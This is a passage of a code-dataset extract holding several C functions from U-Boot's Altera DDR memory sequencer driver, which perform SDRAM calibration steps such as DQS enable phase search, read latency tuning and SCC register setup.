SDR_PHYGRP_RWMGRGRP_ADDRESS |\n\t\t  RW_MGR_RESET_READ_DATAPATH_OFFSET);\n\n\tif (quick_write_mode)\n\t\twritel(0x08, &sdr_rw_load_mgr_regs->load_cntr0);\n\telse\n\t\twritel(0x40, &sdr_rw_load_mgr_regs->load_cntr0);\n\n\twritel(mcc_instruction, &sdr_rw_load_jump_mgr_regs->load_jump_add0);\n\n\t/*\n\t * CNTR 1 - This is used to ensure enough time elapses\n\t * for read data to come back.\n\t */\n\twritel(0x30, &sdr_rw_load_mgr_regs->load_cntr1);\n\n\tif (test_dm) {\n\t\twritel(rwcfg->lfsr_wr_rd_dm_bank_0_wait,\n\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add1);\n\t} else {\n\t\twritel(rwcfg->lfsr_wr_rd_bank_0_wait,\n\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add1);\n\t}\n\n\twritel(mcc_instruction, (SDR_PHYGRP_RWMGRGRP_ADDRESS |\n\t\t\t\tRW_MGR_RUN_SINGLE_GROUP_OFFSET) +\n\t\t\t\t(group << 2));\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * scc_mgr_zero_all() - Zero all DQS config\n *\n * Zero all DQS config.\n */\n", "func_signal": "static void scc_mgr_zero_all(void)", "code": "{\n\tint i, r;\n\n\t/*\n\t * USER Zero all DQS config settings, across all groups and all\n\t * shadow registers\n\t */\n\tfor (r = 0; r < rwcfg->mem_number_of_ranks;\n\t     r += NUM_RANKS_PER_SHADOW_REG) {\n\t\tfor (i = 0; i < rwcfg->mem_if_read_dqs_width; i++) {\n\t\t\t/*\n\t\t\t * The phases actually don't exist on a per-rank basis,\n\t\t\t * but there's no harm updating them several times, so\n\t\t\t * let's keep the code simple.\n\t\t\t */\n\t\t\tscc_mgr_set_dqs_bus_in_delay(i, iocfg->dqs_in_reserve);\n\t\t\tscc_mgr_set_dqs_en_phase(i, 0);\n\t\t\tscc_mgr_set_dqs_en_delay(i, 0);\n\t\t}\n\n\t\tfor (i = 0; i < rwcfg->mem_if_write_dqs_width; i++) {\n\t\t\tscc_mgr_set_dqdqs_output_phase(i, 0);\n\t\t\t/* Arria V/Cyclone V don't have out2. */\n\t\t\tscc_mgr_set_oct_out1_delay(i, iocfg->dqs_out_reserve);\n\t\t}\n\t}\n\n\t/* Multicast to all DQS group enables. */\n\twritel(0xff, &sdr_scc_mgr->dqs_ena);\n\twritel(0, &sdr_scc_mgr->update);\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * rw_mgr_mem_calibrate_vfifo_find_dqs_en_phase() - Find a good DQS enable to use\n * @grp:\tRead/Write Group\n *\n * Find a good DQS enable to use.\n */\n", "func_signal": "static int rw_mgr_mem_calibrate_vfifo_find_dqs_en_phase(const u32 grp)", "code": "{\n\tu32 d, p, i;\n\tu32 dtaps_per_ptap;\n\tu32 work_bgn, work_end;\n\tu32 found_passing_read, found_failing_read = 0, initial_failing_dtap;\n\tint ret;\n\n\tdebug(\"%s:%d %u\\n\", __func__, __LINE__, grp);\n\n\treg_file_set_sub_stage(CAL_SUBSTAGE_VFIFO_CENTER);\n\n\tscc_mgr_set_dqs_en_delay_all_ranks(grp, 0);\n\tscc_mgr_set_dqs_en_phase_all_ranks(grp, 0);\n\n\t/* Step 0: Determine number of delay taps for each phase tap. */\n\tdtaps_per_ptap = iocfg->delay_per_opa_tap /\n\t\t\t iocfg->delay_per_dqs_en_dchain_tap;\n\n\t/* Step 1: First push vfifo until we get a failing read. */\n\tfind_vfifo_failing_read(grp);\n\n\t/* Step 2: Find first working phase, increment in ptaps. */\n\twork_bgn = 0;\n\tret = sdr_working_phase(grp, &work_bgn, &d, &p, &i);\n\tif (ret)\n\t\treturn ret;\n\n\twork_end = work_bgn;\n\n\t/*\n\t * If d is 0 then the working window covers a phase tap and we can\n\t * follow the old procedure. Otherwise, we've found the beginning\n\t * and we need to increment the dtaps until we find the end.\n\t */\n\tif (d == 0) {\n\t\t/*\n\t\t * Step 3a: If we have room, back off by one and\n\t\t *          increment in dtaps.\n\t\t */\n\t\tsdr_backup_phase(grp, &work_bgn, &p);\n\n\t\t/*\n\t\t * Step 4a: go forward from working phase to non working\n\t\t * phase, increment in ptaps.\n\t\t */\n\t\tret = sdr_nonworking_phase(grp, &work_end, &p, &i);\n\t\tif (ret)\n\t\t\treturn ret;\n\n\t\t/* Step 5a: Back off one from last, increment in dtaps. */\n\n\t\t/* Special case code for backing up a phase */\n\t\tif (p == 0) {\n\t\t\tp = iocfg->dqs_en_phase_max;\n\t\t\trw_mgr_decr_vfifo(grp);\n\t\t} else {\n\t\t\tp = p - 1;\n\t\t}\n\n\t\twork_end -= iocfg->delay_per_opa_tap;\n\t\tscc_mgr_set_dqs_en_phase_all_ranks(grp, p);\n\n\t\td = 0;\n\n\t\tdebug_cond(DLEVEL >= 2, \"%s:%d p: ptap=%u\\n\",\n\t\t\t   __func__, __LINE__, p);\n\t}\n\n\t/* The dtap increment to find the failing edge is done here. */\n\tsdr_find_phase_delay(0, 1, grp, &work_end,\n\t\t\t     iocfg->delay_per_dqs_en_dchain_tap, &d);\n\n\t/* Go back to working dtap */\n\tif (d != 0)\n\t\twork_end -= iocfg->delay_per_dqs_en_dchain_tap;\n\n\tdebug_cond(DLEVEL >= 2,\n\t\t   \"%s:%d p/d: ptap=%u dtap=%u end=%u\\n\",\n\t\t   __func__, __LINE__, p, d - 1, work_end);\n\n\tif (work_end < work_bgn) {\n\t\t/* nil range */\n\t\tdebug_cond(DLEVEL >= 2, \"%s:%d end-2: failed\\n\",\n\t\t\t   __func__, __LINE__);\n\t\treturn -EINVAL;\n\t}\n\n\tdebug_cond(DLEVEL >= 2, \"%s:%d found range [%u,%u]\\n\",\n\t\t   __func__, __LINE__, work_bgn, work_end);\n\n\t/*\n\t * We need to calculate the number of dtaps that equal a ptap.\n\t * To do that we'll back up a ptap and re-find the edge of the\n\t * window using dtaps\n\t */\n\tdebug_cond(DLEVEL >= 2, \"%s:%d calculate dtaps_per_ptap for tracking\\n\",\n\t\t   __func__, __LINE__);\n\n\t/* Special case code for backing up a phase */\n\tif (p == 0) {\n\t\tp = iocfg->dqs_en_phase_max;\n\t\trw_mgr_decr_vfifo(grp);\n\t\tdebug_cond(DLEVEL >= 2, \"%s:%d backedup cycle/phase: p=%u\\n\",\n\t\t\t   __func__, __LINE__, p);\n\t} else {\n\t\tp = p - 1;\n\t\tdebug_cond(DLEVEL >= 2, \"%s:%d backedup phase only: p=%u\",\n\t\t\t   __func__, __LINE__, p);\n\t}\n\n\tscc_mgr_set_dqs_en_phase_all_ranks(grp, p);\n\n\t/*\n\t * Increase dtap until we first see a passing read (in case the\n\t * window is smaller than a ptap), and then a failing read to\n\t * mark the edge of the window again.\n\t */\n\n\t/* Find a passing read. */\n\tdebug_cond(DLEVEL >= 2, \"%s:%d find passing read\\n\",\n\t\t   __func__, __LINE__);\n\n\tinitial_failing_dtap = d;\n\n\tfound_passing_read = !sdr_find_phase_delay(1, 1, grp, NULL, 0, &d);\n\tif (found_passing_read) {\n\t\t/* Find a failing read. */\n\t\tdebug_cond(DLEVEL >= 2, \"%s:%d find failing read\\n\",\n\t\t\t   __func__, __LINE__);\n\t\td++;\n\t\tfound_failing_read = !sdr_find_phase_delay(0, 1, grp, NULL, 0,\n\t\t\t\t\t\t\t   &d);\n\t} else {\n\t\tdebug_cond(DLEVEL >= 1,\n\t\t\t   \"%s:%d failed to calculate dtaps per ptap. Fall back on static value\\n\",\n\t\t\t   __func__, __LINE__);\n\t}\n\n\t/*\n\t * The dynamically calculated dtaps_per_ptap is only valid if we\n\t * found a passing/failing read. If we didn't, it means d hit the max\n\t * (iocfg->dqs_en_delay_max). Otherwise, dtaps_per_ptap retains its\n\t * statically calculated value.\n\t */\n\tif (found_passing_read && found_failing_read)\n\t\tdtaps_per_ptap = d - initial_failing_dtap;\n\n\twritel(dtaps_per_ptap, &sdr_reg_file->dtaps_per_ptap);\n\tdebug_cond(DLEVEL >= 2, \"%s:%d dtaps_per_ptap=%u - %u = %u\",\n\t\t   __func__, __LINE__, d, initial_failing_dtap, dtaps_per_ptap);\n\n\t/* Step 6: Find the centre of the window. */\n\tret = sdr_find_window_center(grp, work_bgn, work_end);\n\n\treturn ret;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * rw_mgr_mem_calibrate_lfifo() - Minimize latency\n *\n * Stage 4: Minimize latency.\n *\n * This function implements UniPHY calibration Stage 4, as explained in\n * detail in Altera EMI_RM 2015.05.04 , \"UniPHY Calibration Stages\".\n * Calibrate LFIFO to find smallest read latency.\n */\n", "func_signal": "static u32 rw_mgr_mem_calibrate_lfifo(void)", "code": "{\n\tint found_one = 0;\n\n\tdebug(\"%s:%d\\n\", __func__, __LINE__);\n\n\t/* Update info for sims. */\n\treg_file_set_stage(CAL_STAGE_LFIFO);\n\treg_file_set_sub_stage(CAL_SUBSTAGE_READ_LATENCY);\n\n\t/* Load up the patterns used by read calibration for all ranks */\n\trw_mgr_mem_calibrate_read_load_patterns(0, 1);\n\n\tdo {\n\t\twritel(gbl->curr_read_lat, &phy_mgr_cfg->phy_rlat);\n\t\tdebug_cond(DLEVEL >= 2, \"%s:%d lfifo: read_lat=%u\",\n\t\t\t   __func__, __LINE__, gbl->curr_read_lat);\n\n\t\tif (!rw_mgr_mem_calibrate_read_test_all_ranks(0, NUM_READ_TESTS,\n\t\t\t\t\t\t\t      PASS_ALL_BITS, 1))\n\t\t\tbreak;\n\n\t\tfound_one = 1;\n\t\t/*\n\t\t * Reduce read latency and see if things are\n\t\t * working correctly.\n\t\t */\n\t\tgbl->curr_read_lat--;\n\t} while (gbl->curr_read_lat > 0);\n\n\t/* Reset the fifos to get pointers to known state. */\n\twritel(0, &phy_mgr_cmd->fifo_reset);\n\n\tif (found_one) {\n\t\t/* Add a fudge factor to the read latency that was determined */\n\t\tgbl->curr_read_lat += 2;\n\t\twritel(gbl->curr_read_lat, &phy_mgr_cfg->phy_rlat);\n\t\tdebug_cond(DLEVEL >= 2,\n\t\t\t   \"%s:%d lfifo: success: using read_lat=%u\\n\",\n\t\t\t   __func__, __LINE__, gbl->curr_read_lat);\n\t} else {\n\t\tset_failing_group_stage(0xff, CAL_STAGE_LFIFO,\n\t\t\t\t\tCAL_SUBSTAGE_READ_LATENCY);\n\n\t\tdebug_cond(DLEVEL >= 2,\n\t\t\t   \"%s:%d lfifo: failed at initial read_lat=%u\\n\",\n\t\t\t   __func__, __LINE__, gbl->curr_read_lat);\n\t}\n\n\treturn found_one;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * scc_mgr_set_hhp_extras() - Set HHP extras.\n *\n * Load the fixed setting in the SCC manager HHP extras.\n */\n", "func_signal": "static void scc_mgr_set_hhp_extras(void)", "code": "{\n\t/*\n\t * Load the fixed setting in the SCC manager\n\t * bits: 0:0 = 1'b1\t- DQS bypass\n\t * bits: 1:1 = 1'b1\t- DQ bypass\n\t * bits: 4:2 = 3'b001\t- rfifo_mode\n\t * bits: 6:5 = 2'b01\t- rfifo clock_select\n\t * bits: 7:7 = 1'b0\t- separate gating from ungating setting\n\t * bits: 8:8 = 1'b0\t- separate OE from Output delay setting\n\t */\n\tconst u32 value = (0 << 8) | (0 << 7) | (1 << 5) |\n\t\t\t  (1 << 2) | (1 << 1) | (1 << 0);\n\tconst u32 addr = SDR_PHYGRP_SCCGRP_ADDRESS |\n\t\t\t SCC_MGR_HHP_GLOBALS_OFFSET |\n\t\t\t SCC_MGR_HHP_EXTRAS_OFFSET;\n\n\tdebug_cond(DLEVEL >= 1, \"%s:%d Setting HHP Extras\\n\",\n\t\t   __func__, __LINE__);\n\twritel(value, addr);\n\tdebug_cond(DLEVEL >= 1, \"%s:%d Done Setting HHP Extras\\n\",\n\t\t   __func__, __LINE__);\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * scc_mgr_initialize() - Initialize SCC Manager registers\n *\n * Initialize SCC Manager registers.\n */\n", "func_signal": "static void scc_mgr_initialize(void)", "code": "{\n\t/*\n\t * Clear register file for HPS. 16 (2^4) is the size of the\n\t * full register file in the scc mgr:\n\t *\tRFILE_DEPTH = 1 + log2(MEM_DQ_PER_DQS + 1 + MEM_DM_PER_DQS +\n\t *                             MEM_IF_READ_DQS_WIDTH - 1);\n\t */\n\tint i;\n\n\tfor (i = 0; i < 16; i++) {\n\t\tdebug_cond(DLEVEL >= 1, \"%s:%d: Clearing SCC RFILE index %u\\n\",\n\t\t\t   __func__, __LINE__, i);\n\t\tscc_mgr_set(SCC_MGR_HHP_RFILE_OFFSET, i, 0);\n\t}\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * scc_mgr_apply_group_dq_out1_delay() - Apply and load an output delay for the DQ pins in a group\n * @delay:\t\tDelay value\n *\n * Apply and load a particular output delay for the DQ pins in a group.\n */\n", "func_signal": "static void scc_mgr_apply_group_dq_out1_delay(const u32 delay)", "code": "{\n\tint i;\n\n\tfor (i = 0; i < rwcfg->mem_dq_per_write_dqs; i++) {\n\t\tscc_mgr_set_dq_out1_delay(i, delay);\n\t\tscc_mgr_load_dq(i);\n\t}\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * rw_mgr_mem_calibrate_dqs_enable_calibration() - DQS Enable Calibration\n * @rw_group:\tRead/Write Group\n * @test_bgn:\tRank at which the test begins\n *\n * DQS enable calibration ensures reliable capture of the DQ signal without\n * glitches on the DQS line.\n */\n", "func_signal": "static int rw_mgr_mem_calibrate_dqs_enable_calibration(const u32 rw_group,\n\t\t\t\t\t\t       const u32 test_bgn)", "code": "{\n\t/*\n\t * Altera EMI_RM 2015.05.04 :: Figure 1-27\n\t * DQS and DQS Eanble Signal Relationships.\n\t */\n\n\t/* We start at zero, so have one less dq to devide among */\n\tconst u32 delay_step = iocfg->io_in_delay_max /\n\t\t\t       (rwcfg->mem_dq_per_read_dqs - 1);\n\tint ret;\n\tu32 i, p, d, r;\n\n\tdebug(\"%s:%d (%u,%u)\\n\", __func__, __LINE__, rw_group, test_bgn);\n\n\t/* Try different dq_in_delays since the DQ path is shorter than DQS. */\n\tfor (r = 0; r < rwcfg->mem_number_of_ranks;\n\t     r += NUM_RANKS_PER_SHADOW_REG) {\n\t\tfor (i = 0, p = test_bgn, d = 0;\n\t\t     i < rwcfg->mem_dq_per_read_dqs;\n\t\t     i++, p++, d += delay_step) {\n\t\t\tdebug_cond(DLEVEL >= 1,\n\t\t\t\t   \"%s:%d: g=%u r=%u i=%u p=%u d=%u\\n\",\n\t\t\t\t   __func__, __LINE__, rw_group, r, i, p, d);\n\n\t\t\tscc_mgr_set_dq_in_delay(p, d);\n\t\t\tscc_mgr_load_dq(p);\n\t\t}\n\n\t\twritel(0, &sdr_scc_mgr->update);\n\t}\n\n\t/*\n\t * Try rw_mgr_mem_calibrate_vfifo_find_dqs_en_phase across different\n\t * dq_in_delay values\n\t */\n\tret = rw_mgr_mem_calibrate_vfifo_find_dqs_en_phase(rw_group);\n\n\tdebug_cond(DLEVEL >= 1,\n\t\t   \"%s:%d: g=%u found=%u; Reseting delay chain to zero\\n\",\n\t\t   __func__, __LINE__, rw_group, !ret);\n\n\tfor (r = 0; r < rwcfg->mem_number_of_ranks;\n\t     r += NUM_RANKS_PER_SHADOW_REG) {\n\t\tscc_mgr_apply_group_dq_in_delay(test_bgn, 0);\n\t\twritel(0, &sdr_scc_mgr->update);\n\t}\n\n\treturn ret;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * sdr_find_phase() - Find DQS enable phase\n * @working:\tIf 1, look for working phase, if 0, look for non-working phase\n * @grp:\tRead/Write group\n * @work:\tWorking window position\n * @i:\t\tIterator\n * @p:\t\tDQS Phase Iterator\n *\n * Find working or non-working DQS enable phase setting.\n */\n", "func_signal": "static int sdr_find_phase(int working, const u32 grp, u32 *work,\n\t\t\t  u32 *i, u32 *p)", "code": "{\n\tconst u32 end = misccfg->read_valid_fifo_size + (working ? 0 : 1);\n\tint ret;\n\n\tfor (; *i < end; (*i)++) {\n\t\tif (working)\n\t\t\t*p = 0;\n\n\t\tret = sdr_find_phase_delay(working, 0, grp, work,\n\t\t\t\t\t   iocfg->delay_per_opa_tap, p);\n\t\tif (!ret)\n\t\t\treturn 0;\n\n\t\tif (*p > iocfg->dqs_en_phase_max) {\n\t\t\t/* Fiddle with FIFO. */\n\t\t\trw_mgr_incr_vfifo(grp);\n\t\t\tif (!working)\n\t\t\t\t*p = 0;\n\t\t}\n\t}\n\n\treturn -EINVAL;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * rw_mgr_mem_init_load_regs() - Load instruction registers\n * @cntr0:\tCounter 0 value\n * @cntr1:\tCounter 1 value\n * @cntr2:\tCounter 2 value\n * @jump:\tJump instruction value\n *\n * Load instruction registers.\n */\n", "func_signal": "static void rw_mgr_mem_init_load_regs(u32 cntr0, u32 cntr1, u32 cntr2, u32 jump)", "code": "{\n\tu32 grpaddr = SDR_PHYGRP_RWMGRGRP_ADDRESS |\n\t\t\t   RW_MGR_RUN_SINGLE_GROUP_OFFSET;\n\n\t/* Load counters */\n\twritel(SKIP_DELAY_LOOP_VALUE_OR_ZERO(cntr0),\n\t       &sdr_rw_load_mgr_regs->load_cntr0);\n\twritel(SKIP_DELAY_LOOP_VALUE_OR_ZERO(cntr1),\n\t       &sdr_rw_load_mgr_regs->load_cntr1);\n\twritel(SKIP_DELAY_LOOP_VALUE_OR_ZERO(cntr2),\n\t       &sdr_rw_load_mgr_regs->load_cntr2);\n\n\t/* Load jump address */\n\twritel(jump, &sdr_rw_load_jump_mgr_regs->load_jump_add0);\n\twritel(jump, &sdr_rw_load_jump_mgr_regs->load_jump_add1);\n\twritel(jump, &sdr_rw_load_jump_mgr_regs->load_jump_add2);\n\n\t/* Execute count instruction */\n\twritel(jump, grpaddr);\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * sdr_nonworking_phase() - Find non-working DQS enable phase\n * @grp:\tRead/Write group\n * @work_end:\tWorking window end position\n * @p:\t\tDQS Phase Iterator\n * @i:\t\tIterator\n *\n * Find non-working DQS enable phase setting.\n */\n", "func_signal": "static int sdr_nonworking_phase(const u32 grp, u32 *work_end, u32 *p, u32 *i)", "code": "{\n\tint ret;\n\n\t(*p)++;\n\t*work_end += iocfg->delay_per_opa_tap;\n\tif (*p > iocfg->dqs_en_phase_max) {\n\t\t/* Fiddle with FIFO. */\n\t\t*p = 0;\n\t\trw_mgr_incr_vfifo(grp);\n\t}\n\n\tret = sdr_find_phase(0, grp, work_end, i, p);\n\tif (ret) {\n\t\t/* Cannot see edge of failing read. */\n\t\tdebug_cond(DLEVEL >= 2, \"%s:%d: end: failed\\n\",\n\t\t\t   __func__, __LINE__);\n\t}\n\n\treturn ret;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * @mem_skip_calibrate() - Set VFIFO and LFIFO to instant-on settings\n *\n * Set VFIFO and LFIFO to instant-on settings in skip calibration mode.\n */\n", "func_signal": "static void mem_skip_calibrate(void)", "code": "{\n\tu32 vfifo_offset;\n\tu32 i, j, r;\n\n\tdebug(\"%s:%d\\n\", __func__, __LINE__);\n\t/* Need to update every shadow register set used by the interface */\n\tfor (r = 0; r < rwcfg->mem_number_of_ranks;\n\t     r += NUM_RANKS_PER_SHADOW_REG) {\n\t\t/*\n\t\t * Set output phase alignment settings appropriate for\n\t\t * skip calibration.\n\t\t */\n\t\tfor (i = 0; i < rwcfg->mem_if_read_dqs_width; i++) {\n\t\t\tscc_mgr_set_dqs_en_phase(i, 0);\n\t\t\tif (iocfg->dll_chain_length == 6)\n\t\t\t\tscc_mgr_set_dqdqs_output_phase(i, 6);\n\t\t\telse\n\t\t\t\tscc_mgr_set_dqdqs_output_phase(i, 7);\n\t\t\t/*\n\t\t\t * Case:33398\n\t\t\t *\n\t\t\t * Write data arrives to the I/O two cycles before write\n\t\t\t * latency is reached (720 deg).\n\t\t\t *   -> due to bit-slip in a/c bus\n\t\t\t *   -> to allow board skew where dqs is longer than ck\n\t\t\t *      -> how often can this happen!?\n\t\t\t *      -> can claim back some ptaps for high freq\n\t\t\t *       support if we can relax this, but i digress...\n\t\t\t *\n\t\t\t * The write_clk leads mem_ck by 90 deg\n\t\t\t * The minimum ptap of the OPA is 180 deg\n\t\t\t * Each ptap has (360 / IO_DLL_CHAIN_LENGH) deg of delay\n\t\t\t * The write_clk is always delayed by 2 ptaps\n\t\t\t *\n\t\t\t * Hence, to make DQS aligned to CK, we need to delay\n\t\t\t * DQS by:\n\t\t\t *    (720 - 90 - 180 - 2) *\n\t\t\t *      (360 / iocfg->dll_chain_length)\n\t\t\t *\n\t\t\t * Dividing the above by (360 / iocfg->dll_chain_length)\n\t\t\t * gives us the number of ptaps, which simplies to:\n\t\t\t *\n\t\t\t *    (1.25 * iocfg->dll_chain_length - 2)\n\t\t\t */\n\t\t\tscc_mgr_set_dqdqs_output_phase(i,\n\t\t\t\t       ((125 * iocfg->dll_chain_length) / 100) - 2);\n\t\t}\n\t\twritel(0xff, &sdr_scc_mgr->dqs_ena);\n\t\twritel(0xff, &sdr_scc_mgr->dqs_io_ena);\n\n\t\tfor (i = 0; i < rwcfg->mem_if_write_dqs_width; i++) {\n\t\t\twritel(i, SDR_PHYGRP_SCCGRP_ADDRESS |\n\t\t\t\t  SCC_MGR_GROUP_COUNTER_OFFSET);\n\t\t}\n\t\twritel(0xff, &sdr_scc_mgr->dq_ena);\n\t\twritel(0xff, &sdr_scc_mgr->dm_ena);\n\t\twritel(0, &sdr_scc_mgr->update);\n\t}\n\n\t/* Compensate for simulation model behaviour */\n\tfor (i = 0; i < rwcfg->mem_if_read_dqs_width; i++) {\n\t\tscc_mgr_set_dqs_bus_in_delay(i, 10);\n\t\tscc_mgr_load_dqs(i);\n\t}\n\twritel(0, &sdr_scc_mgr->update);\n\n\t/*\n\t * ArriaV has hard FIFOs that can only be initialized by incrementing\n\t * in sequencer.\n\t */\n\tvfifo_offset = misccfg->calib_vfifo_offset;\n\tfor (j = 0; j < vfifo_offset; j++)\n\t\twritel(0xff, &phy_mgr_cmd->inc_vfifo_hard_phy);\n\twritel(0, &phy_mgr_cmd->fifo_reset);\n\n\t/*\n\t * For Arria V and Cyclone V with hard LFIFO, we get the skip-cal\n\t * setting from generation-time constant.\n\t */\n\tgbl->curr_read_lat = misccfg->calib_lfifo_offset;\n\twritel(gbl->curr_read_lat, &phy_mgr_cfg->phy_rlat);\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * debug_mem_calibrate() - Report result of memory calibration\n * @pass:\tValue indicating whether calibration passed or failed\n *\n * This function reports the results of the memory calibration\n * and writes debug information into the register file.\n */\n", "func_signal": "static void debug_mem_calibrate(int pass)", "code": "{\n\tu32 debug_info;\n\n\tif (pass) {\n\t\tprintf(\"%s: CALIBRATION PASSED\\n\", __FILE__);\n\n\t\tgbl->fom_in /= 2;\n\t\tgbl->fom_out /= 2;\n\n\t\tif (gbl->fom_in > 0xff)\n\t\t\tgbl->fom_in = 0xff;\n\n\t\tif (gbl->fom_out > 0xff)\n\t\t\tgbl->fom_out = 0xff;\n\n\t\t/* Update the FOM in the register file */\n\t\tdebug_info = gbl->fom_in;\n\t\tdebug_info |= gbl->fom_out << 8;\n\t\twritel(debug_info, &sdr_reg_file->fom);\n\n\t\twritel(debug_info, &phy_mgr_cfg->cal_debug_info);\n\t\twritel(PHY_MGR_CAL_SUCCESS, &phy_mgr_cfg->cal_status);\n\t} else {\n\t\tprintf(\"%s: CALIBRATION FAILED\\n\", __FILE__);\n\n\t\tdebug_info = gbl->error_stage;\n\t\tdebug_info |= gbl->error_substage << 8;\n\t\tdebug_info |= gbl->error_group << 16;\n\n\t\twritel(debug_info, &sdr_reg_file->failing_stage);\n\t\twritel(debug_info, &phy_mgr_cfg->cal_debug_info);\n\t\twritel(PHY_MGR_CAL_FAIL, &phy_mgr_cfg->cal_status);\n\n\t\t/* Update the failing group/stage in the register file */\n\t\tdebug_info = gbl->error_stage;\n\t\tdebug_info |= gbl->error_substage << 8;\n\t\tdebug_info |= gbl->error_group << 16;\n\t\twritel(debug_info, &sdr_reg_file->failing_stage);\n\t}\n\n\tprintf(\"%s: Calibration complete\\n\", __FILE__);\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * rw_mgr_mem_calibrate_guaranteed_write() - Perform guaranteed write into the device\n * @rw_group:\tRead/Write Group\n * @phase:\tDQ/DQS phase\n *\n * Because initially no communication ca be reliably performed with the memory\n * device, the sequencer uses a guaranteed write mechanism to write data into\n * the memory device.\n */\n", "func_signal": "static int rw_mgr_mem_calibrate_guaranteed_write(const u32 rw_group,\n\t\t\t\t\t\t const u32 phase)", "code": "{\n\tint ret;\n\n\t/* Set a particular DQ/DQS phase. */\n\tscc_mgr_set_dqdqs_output_phase_all_ranks(rw_group, phase);\n\n\tdebug_cond(DLEVEL >= 1, \"%s:%d guaranteed write: g=%u p=%u\\n\",\n\t\t   __func__, __LINE__, rw_group, phase);\n\n\t/*\n\t * Altera EMI_RM 2015.05.04 :: Figure 1-25\n\t * Load up the patterns used by read calibration using the\n\t * current DQDQS phase.\n\t */\n\trw_mgr_mem_calibrate_read_load_patterns(0, 1);\n\n\tif (gbl->phy_debug_mode_flags & PHY_DEBUG_DISABLE_GUARANTEED_READ)\n\t\treturn 0;\n\n\t/*\n\t * Altera EMI_RM 2015.05.04 :: Figure 1-26\n\t * Back-to-Back reads of the patterns used for calibration.\n\t */\n\tret = rw_mgr_mem_calibrate_read_test_patterns(0, rw_group, 1);\n\tif (ret)\n\t\tdebug_cond(DLEVEL >= 1,\n\t\t\t   \"%s:%d Guaranteed read test failed: g=%u p=%u\\n\",\n\t\t\t   __func__, __LINE__, rw_group, phase);\n\treturn ret;\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * set_jump_as_return() - Return instruction optimization\n *\n * Optimization used to recover some slots in ddr3 inst_rom could be\n * applied to other protocols if we wanted to\n */\n", "func_signal": "static void set_jump_as_return(void)", "code": "{\n\t/*\n\t * To save space, we replace return with jump to special shared\n\t * RETURN instruction so we set the counter to large value so that\n\t * we always jump.\n\t */\n\twritel(0xff, &sdr_rw_load_mgr_regs->load_cntr0);\n\twritel(rwcfg->rreturn, &sdr_rw_load_jump_mgr_regs->load_jump_add0);\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * mem_calibrate() - Memory calibration entry point.\n *\n * Perform memory calibration.\n */\n", "func_signal": "static u32 mem_calibrate(void)", "code": "{\n\tu32 i;\n\tu32 rank_bgn, sr;\n\tu32 write_group, write_test_bgn;\n\tu32 read_group, read_test_bgn;\n\tu32 run_groups, current_run;\n\tu32 failing_groups = 0;\n\tu32 group_failed = 0;\n\n\tconst u32 rwdqs_ratio = rwcfg->mem_if_read_dqs_width /\n\t\t\t\trwcfg->mem_if_write_dqs_width;\n\n\tdebug(\"%s:%d\\n\", __func__, __LINE__);\n\n\t/* Initialize the data settings */\n\tgbl->error_substage = CAL_SUBSTAGE_NIL;\n\tgbl->error_stage = CAL_STAGE_NIL;\n\tgbl->error_group = 0xff;\n\tgbl->fom_in = 0;\n\tgbl->fom_out = 0;\n\n\t/* Initialize WLAT and RLAT. */\n\tmem_init_latency();\n\n\t/* Initialize bit slips. */\n\tmem_precharge_and_activate();\n\n\tfor (i = 0; i < rwcfg->mem_if_read_dqs_width; i++) {\n\t\twritel(i, SDR_PHYGRP_SCCGRP_ADDRESS |\n\t\t\t  SCC_MGR_GROUP_COUNTER_OFFSET);\n\t\t/* Only needed once to set all groups, pins, DQ, DQS, DM. 